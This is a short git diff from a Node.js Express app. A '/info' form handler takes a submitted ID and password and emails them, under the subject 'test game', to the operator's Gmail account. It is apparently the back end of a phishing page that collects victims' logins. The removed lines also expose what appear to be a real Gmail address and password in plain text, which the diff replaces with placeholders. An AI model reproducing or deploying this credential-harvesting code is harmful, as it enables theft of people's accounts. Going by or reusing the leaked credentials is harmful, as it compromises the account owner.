@@ -21,15 +21,15 @@ app.get('/', (req, res) => {
   let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'peterkarki99@gmail.com',
-        pass: 'peterkarki99@GO'
+        user: '<email>',
+        pass: '<pass>'
     }
 });
 
 app.post('/info',urlencodedParser,(req,res)=>{
     let mailOptions = {
-        from: 'peterkarki99@gmail.com', 
-        to: 'peterkarki99@gmail.com',
+        from: '<email>', 
+        to: '<email>',
         subject: 'test game',
         text: 'ID :'+req.body.id+' Pass :'+req.body.password,
         
